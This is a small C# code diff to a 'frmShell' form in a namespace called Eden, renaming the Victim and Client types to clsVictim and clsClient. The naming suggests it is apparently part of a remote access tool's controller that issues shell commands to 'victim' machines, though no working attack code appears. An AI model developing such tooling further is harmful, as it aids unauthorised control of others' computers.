@@ -12,7 +12,7 @@ namespace Eden
 {
     public partial class frmShell : Form
     {
-        private Victim m_victim;
+        private clsVictim m_victim;
         public string m_szVictimID;
 
         private enum HistoryCmd
@@ -21,14 +21,14 @@ namespace Eden
             Next,
         }
 
-        public frmShell(Victim victim)
+        public frmShell(clsVictim victim)
         {
             InitializeComponent();
 
             m_victim = victim;
         }
 
-        private void fnReceived(Client m_clnt, string szVictimID, string[] aszMsg)
+        private void fnReceived(clsClient m_clnt, string szVictimID, string[] aszMsg)
         {
             try
             {
